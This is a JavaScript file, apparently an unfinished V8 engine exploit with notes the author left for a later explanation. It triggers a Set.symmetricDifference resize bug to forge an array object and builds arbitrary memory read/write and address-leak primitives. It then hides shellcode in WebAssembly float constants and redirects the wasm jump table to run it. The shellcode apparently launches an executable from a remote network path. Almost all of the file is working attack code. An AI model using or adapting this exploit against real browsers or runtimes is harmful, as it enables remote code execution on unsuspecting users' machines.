/* helpers */

let fi_buf = new ArrayBuffer(8); // shared buffer
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert bigint to hex string
function hex(i) {
    return '0x' + i.toString(16);
}

let receiver = new Set();
let other = new Set();

for (let i = 0; i < 32; i++) { receiver.add(i); } // elements: 32, capacity: 32

let fake_arr_struct;
let obj_arr;

other.keys = () => {
    fake_arr_struct = [1.1, 2.2, 3.3];
    receiver.add(32); // elements: 33, capacity: 64 (grow, allocate new table)
    obj_arr = [{}];   // DONT UNDERSTAND THIS
    return other[Symbol.iterator](); // match return type (Set Iterator)
}

let result = receiver.symmetricDifference(other);

let map = 0x10ed71n; // PACKED_DOUBLE_ELEMENTS
let properties = 0x6cdn; // FixedArray[0]
let elements = 0x41414141n; // arbitrary address
let length = 1n << 1n; // length: 1

fake_arr_struct[1] = itof(map | properties << 32n);
fake_arr_struct[2] = itof(elements | length << 32n);

for (let i = 0; i < 0x10; i++) { result.delete(i); }

// fake_arr now points to the fake JSArray structure
let fake_arr = result.size;

function aar(addr) {
    elements = addr - 8n + 1n;
    fake_arr_struct[2] = itof(elements | length << 32n);
    return fake_arr[0];
}

function aaw(addr, value) {
    elements = addr - 8n + 1n;
    fake_arr_struct[2] = itof(elements | length << 32n);
    fake_arr[0] = itof(value);
}

let v8base = (ftoi(aar(0x24n)) & 0xffffffffn) << 32n;
console.log('[+] V8 base: ' + hex(v8base));

// NEED TO EXPLAIN HOW WE CAN SEARCH FOR MARKERS
let marker;
let leaked;

marker = 0x4141414141414141n
fake_arr_struct[0] = itof(marker);
let fake_arr_addr = 0x4a000n;
for (let i = 0; i < 0x1000; i++) {
    leaked = ftoi(aar(fake_arr_addr));
    if (leaked == marker) break;
    fake_arr_addr += 4n;
}
fake_arr_addr += 8n;

marker = fake_arr_addr + 1n;
obj_arr[0] = fake_arr;
let obj_arr_addr = fake_arr_addr + 0x30n;
for (let i = 0; i < 0x1000; i++) {
    leaked = ftoi(aar(obj_arr_addr)) & 0xffffffffn;
    if (leaked == marker) break;
    obj_arr_addr += 4n;
}

function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(aar(obj_arr_addr)) & 0xffffffffn;
}

let wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 249, 1, 1, 246, 1, 0, 68, 72, 49, 201, 144, 144, 144, 235, 7, 68, 72, 131, 193, 96, 144, 144, 235, 7, 68, 101, 72, 139, 1, 144, 144, 235, 7, 68, 72, 139, 64, 24, 144, 144, 235, 7, 68, 72, 139, 112, 32, 144, 144, 235, 7, 68, 72, 173, 72, 150, 72, 173, 235, 7, 68, 76, 139, 120, 32, 144, 144, 235, 7, 68, 144, 144, 144, 144, 144, 144, 235, 12, 68, 187, 128, 18, 0, 0, 144, 235, 12, 68, 76, 1, 251, 73, 137, 222, 235, 12, 68, 72, 49, 192, 144, 144, 144, 235, 12, 68, 72, 13, 46, 101, 120, 101, 235, 12, 68, 80, 144, 144, 144, 144, 144, 235, 12, 68, 184, 92, 115, 92, 109, 144, 235, 12, 68, 72, 15, 164, 192, 30, 144, 235, 12, 68, 72, 15, 164, 192, 2, 144, 235, 12, 68, 72, 13, 46, 49, 57, 53, 235, 12, 68, 144, 80, 144, 144, 144, 144, 235, 12, 68, 184, 46, 56, 46, 50, 144, 235, 12, 68, 72, 15, 164, 192, 29, 144, 235, 15, 68, 72, 15, 164, 192, 3, 144, 235, 15, 68, 72, 13, 92, 92, 49, 48, 235, 15, 68, 144, 144, 80, 144, 144, 144, 235, 15, 68, 72, 137, 225, 144, 144, 144, 235, 15, 68, 186, 5, 0, 0, 0, 144, 235, 15, 68, 144, 144, 72, 131, 236, 56, 235, 15, 68, 65, 255, 214, 144, 144, 144, 235, 23, 15, 11, 0, 10, 4, 110, 97, 109, 101, 2, 3, 1, 0, 0]);


let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
let main = wasmInstance.exports.main;

let wasmInstance_addr = addrof(wasmInstance);
let jump_table_start = ftoi(aar(wasmInstance_addr + 0x47n));
aaw(wasmInstance_addr + 0x47n, jump_table_start + 0x81an); // overwrite instruction pointer

print('lets go!');

main();
